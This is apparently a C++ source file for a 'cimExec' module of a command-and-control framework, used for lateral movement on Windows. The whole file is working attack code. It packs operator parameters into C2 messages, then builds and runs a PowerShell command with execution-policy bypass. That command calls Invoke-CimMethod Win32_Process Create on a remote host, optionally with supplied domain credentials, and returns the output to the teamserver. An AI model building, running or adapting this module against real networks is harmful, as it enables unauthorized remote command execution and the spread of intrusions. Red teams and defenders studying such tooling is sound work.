#include "CimExec.hpp"

#include "Common.hpp"

#include <sstream>

#ifdef _WIN32
#include <windows.h>
#include <cstdio>
#endif

using namespace std;

constexpr std::string_view moduleNameCim = "cimExec";
constexpr unsigned long long moduleHashCim = djb2(moduleNameCim);

#ifdef _WIN32
extern "C" __declspec(dllexport) CimExec* CimExecConstructor()
{
    return new CimExec();
}
#else
extern "C" __attribute__((visibility("default"))) CimExec* CimExecConstructor()
{
    return new CimExec();
}
#endif

CimExec::CimExec()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleNameCim), moduleHashCim)
#else
    : ModuleCmd("", moduleHashCim)
#endif
{
}

CimExec::~CimExec() = default;

std::string CimExec::getInfo()
{
    std::ostringstream oss;
#ifdef BUILD_TEAMSERVER
    oss << "CIM/MI Execution Module:\n";
    oss << "Invoke Win32_Process.Create through the MI API (via PowerShell CIM)." << '\n';
    oss << "Options:" << '\n';
    oss << "  -h <host>            Remote host." << '\n';
    oss << "  -n <namespace>      Namespace (default root/cimv2)." << '\n';
    oss << "  -c <command>        Command to execute." << '\n';
    oss << "  -a <arguments>      Arguments for the command." << '\n';
    oss << "  -u <user>           DOMAIN\\user credentials." << '\n';
    oss << "  -p <password>       Password for the credential." << '\n';
    oss << "Example:" << '\n';
    oss << "  cimExec -h server01 -c cmd.exe -a \"/c ipconfig\"" << '\n';
#endif
    return oss.str();
}

std::string CimExec::packParameters(const Parameters& params) const
{
    std::string packed;
    auto append = [&packed](const std::string& value)
    {
        packed.append(value);
        packed.push_back('\0');
    };

    append(params.hostname);
    append(params.namespaceName);
    append(params.command);
    append(params.arguments);
    append(params.username);
    append(params.password);
    return packed;
}

CimExec::Parameters CimExec::unpackParameters(const std::string& data) const
{
    Parameters params;
    std::vector<std::string> parts;
    size_t start = 0;
    while (start < data.size())
    {
        size_t end = data.find('\0', start);
        if (end == std::string::npos)
        {
            break;
        }
        parts.emplace_back(data.substr(start, end - start));
        start = end + 1;
    }

    if (parts.size() < 6)
    {
        return params;
    }

    params.hostname = parts[0];
    params.namespaceName = parts[1];
    params.command = parts[2];
    params.arguments = parts[3];
    params.username = parts[4];
    params.password = parts[5];
    return params;
}

int CimExec::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    std::vector<std::string> args = regroupStrings(splitedCmd);
    Parameters params;
    params.namespaceName = "root/cimv2";

    if (args.size() < 2)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    for (size_t i = 1; i < args.size(); ++i)
    {
        const std::string& current = args[i];
        if (current == "-h" && i + 1 < args.size())
        {
            params.hostname = args[++i];
        }
        else if (current == "-n" && i + 1 < args.size())
        {
            params.namespaceName = args[++i];
        }
        else if (current == "-c" && i + 1 < args.size())
        {
            params.command = args[++i];
        }
        else if (current == "-a" && i + 1 < args.size())
        {
            params.arguments = args[++i];
        }
        else if (current == "-u" && i + 1 < args.size())
        {
            params.username = args[++i];
        }
        else if (current == "-p" && i + 1 < args.size())
        {
            params.password = args[++i];
        }
        else if (!current.empty() && current[0] != '-')
        {
            if (params.hostname.empty())
            {
                params.hostname = current;
            }
            else if (params.command.empty())
            {
                params.command = current;
            }
            else if (params.arguments.empty())
            {
                params.arguments = current;
            }
        }
    }

    if (params.hostname.empty() || params.command.empty())
    {
        c2Message.set_returnvalue("Missing hostname or command.\n" + getInfo());
        return -1;
    }

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(packParameters(params));
#endif
    return 0;
}

int CimExec::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    Parameters params = unpackParameters(c2Message.cmd());
    std::string result;

#ifdef _WIN32
    result = invoke(params);
#else
    (void)params;
    result = "CIM execution is only supported on Windows.\n";
#endif

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());
    c2RetMessage.set_returnvalue(result);
    return 0;
}

int CimExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
    errorMsg = c2RetMessage.returnvalue();
    return 0;
}

#ifdef _WIN32
namespace
{
    std::string escapeSingleQuotes(const std::string& input)
    {
        std::string escaped;
        escaped.reserve(input.size() * 2);
        for (char ch : input)
        {
            escaped.push_back(ch);
            if (ch == '\'')
            {
                escaped.push_back('\'');
            }
        }
        return escaped;
    }
}

std::string CimExec::invoke(const Parameters& params) const
{
    std::ostringstream powershell;
    powershell << "powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"";
    powershell << "$ns='" << escapeSingleQuotes(params.namespaceName) << "';";
    powershell << "$cmd='" << escapeSingleQuotes(params.command) << "'";
    powershell << ";$args='" << escapeSingleQuotes(params.arguments) << "'";

    if (!params.username.empty())
    {
        powershell << ";$sec=ConvertTo-SecureString '" << escapeSingleQuotes(params.password) << "' -AsPlainText -Force";
        powershell << ";$cred=New-Object System.Management.Automation.PSCredential('" << escapeSingleQuotes(params.username) << "',$sec)";
        powershell << ";Invoke-CimMethod -ComputerName '" << escapeSingleQuotes(params.hostname) << "' -Namespace $ns -ClassName Win32_Process -MethodName Create -Credential $cred -Arguments @{ CommandLine=($cmd + ' ' + $args).Trim() }";
    }
    else
    {
        powershell << ";Invoke-CimMethod -ComputerName '" << escapeSingleQuotes(params.hostname) << "' -Namespace $ns -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine=($cmd + ' ' + $args).Trim() }";
    }

    powershell << "\"";

    FILE* pipe = _popen(powershell.str().c_str(), "rt");
    if (!pipe)
    {
        return "Failed to start PowerShell for CIM execution.\n";
    }

    std::ostringstream output;
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe))
    {
        output << buffer;
    }
    _pclose(pipe);

    std::string result = output.str();
    if (result.empty())
    {
        result = "Command executed with no output.\n";
    }
    return result;
}
#endif
